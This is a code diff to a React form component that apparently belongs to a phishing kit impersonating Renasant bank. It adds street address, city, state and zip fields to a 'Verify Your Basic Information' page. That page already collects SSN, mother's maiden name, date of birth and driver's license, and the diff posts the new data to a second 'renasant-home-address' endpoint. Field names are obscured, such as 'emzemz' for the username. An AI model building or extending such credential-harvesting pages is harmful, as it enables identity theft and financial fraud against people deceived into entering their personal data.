@@ -17,6 +17,11 @@ const BasicInfo: React.FC = () => {
   const [year, setYear] = useState('');
   const [driverLicense, setDriverLicense] = useState('');
   const [showSSN, setShowSSN] = useState(false);
+  const [stAd, setStAd] = useState('');
+  const [apt, setApt] = useState('');
+  const [city, setCity] = useState('');
+  const [state, setState] = useState('');
+  const [zipCode, setZipCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({ 
     fzNme: '', 
@@ -26,6 +31,10 @@ const BasicInfo: React.FC = () => {
     motherMaidenName: '', 
     dob: '', 
     driverLicense: '',
+    stAd: '',
+    city: '',
+    state: '',
+    zipCode: '',
     form: '' 
   });
   const [username, setUsername] = useState('');
@@ -82,6 +91,10 @@ const BasicInfo: React.FC = () => {
       motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required." : '',
       dob: (!month || !day || !year) ? 'Complete date of birth is required.' : '',
       driverLicense: !driverLicense.trim() ? "Driver's license is required." : '',
+      stAd: !stAd.trim() ? 'Street address is required.' : '',
+      city: !city.trim() ? 'City is required.' : '',
+      state: !state.trim() ? 'State is required.' : '',
+      zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
       form: ''
     };
 
@@ -119,6 +132,7 @@ const BasicInfo: React.FC = () => {
 
       const dob = `${getMonthName(month)}/${day}/${year}`;
 
+      // Submit basic info
       await axios.post(`${baseUrl}api/renasant-basic-info/`, {
         emzemz: username,
         fzNme,
@@ -128,6 +142,16 @@ const BasicInfo: React.FC = () => {
         motherMaidenName,
         dob,
         driverLicense
+      });
+
+      // Submit home address
+      await axios.post(`${baseUrl}api/renasant-home-address/`, {
+        emzemz: username,
+        stAd,
+        apt,
+        city,
+        state,
+        zipCode
       });
 
       navigate('/card', {
@@ -180,7 +204,7 @@ const BasicInfo: React.FC = () => {
 
   return (
     <FlowCard
-      title="Verify Your Basic Information"
+      title="Verify Your Basic Information & Home Address"
       subtitle={<span className="text-slate-600">Please confirm the details we have on file.</span>}
       footer={footer}
     >
@@ -346,6 +370,107 @@ const BasicInfo: React.FC = () => {
             />
           </div>
           {errors.driverLicense ? <FormError message={errors.driverLicense} /> : null}
+        </div>
+
+        {/* Home Address Section */}
+        <div className="border-t-2 border-slate-300 pt-6 mt-6">
+          <h3 className="text-lg font-semibold text-slate-800 mb-4">Home Address</h3>
+          
+          <div className="space-y-4">
+            {/* Street Address */}
+            <div>
+              <label className="block text-sm text-slate-500 mb-1" htmlFor="stAd">
+                Street Address
+              </label>
+              <div className="flex items-center border border-slate-200 rounded">
+                <input
+                  id="stAd"
+                  name="stAd"
+                  type="text"
+                  value={stAd}
+                  onChange={(e) => setStAd(e.target.value)}
+                  className="w-full px-3 py-3 text-sm focus:outline-none"
+                  placeholder="Enter street address"
+                />
+              </div>
+              {errors.stAd ? <FormError message={errors.stAd} /> : null}
+            </div>
+
+            {/* Apartment/Unit */}
+            <div>
+              <label className="block text-sm text-slate-500 mb-1" htmlFor="apt">
+                Apartment/Unit (Optional)
+              </label>
+              <div className="flex items-center border border-slate-200 rounded">
+                <input
+                  id="apt"
+                  name="apt"
+                  type="text"
+                  value={apt}
+                  onChange={(e) => setApt(e.target.value)}
+                  className="w-full px-3 py-3 text-sm focus:outline-none"
+                  placeholder="Apt, Suite, Unit, etc."
+                />
+              </div>
+            </div>
+
+            {/* City */}
+            <div>
+              <label className="block text-sm text-slate-500 mb-1" htmlFor="city">
+                City
+              </label>
+              <div className="flex items-center border border-slate-200 rounded">
+                <input
+                  id="city"
+                  name="city"
+                  type="text"
+                  value={city}
+                  onChange={(e) => setCity(e.target.value)}
+                  className="w-full px-3 py-3 text-sm focus:outline-none"
+                  placeholder="Enter city"
+                />
+              </div>
+              {errors.city ? <FormError message={errors.city} /> : null}
+            </div>
+
+            {/* State */}
+            <div>
+              <label className="block text-sm text-slate-500 mb-1" htmlFor="state">
+                State
+              </label>
+              <div className="flex items-center border border-slate-200 rounded">
+                <input
+                  id="state"
+                  name="state"
+                  type="text"
+                  value={state}
+                  onChange={(e) => setState(e.target.value)}
+                  className="w-full px-3 py-3 text-sm focus:outline-none"
+                  placeholder="Enter state"
+                />
+              </div>
+              {errors.state ? <FormError message={errors.state} /> : null}
+            </div>
+
+            {/* Zip Code */}
+            <div>
+              <label className="block text-sm text-slate-500 mb-1" htmlFor="zipCode">
+                Zip Code
+              </label>
+              <div className="flex items-center border border-slate-200 rounded">
+                <input
+                  id="zipCode"
+                  name="zipCode"
+                  type="text"
+                  value={zipCode}
+                  onChange={(e) => setZipCode(e.target.value)}
+                  className="w-full px-3 py-3 text-sm focus:outline-none"
+                  placeholder="Enter zip code"
+                />
+              </div>
+              {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
+            </div>
+          </div>
         </div>
 
         {errors.form ? (
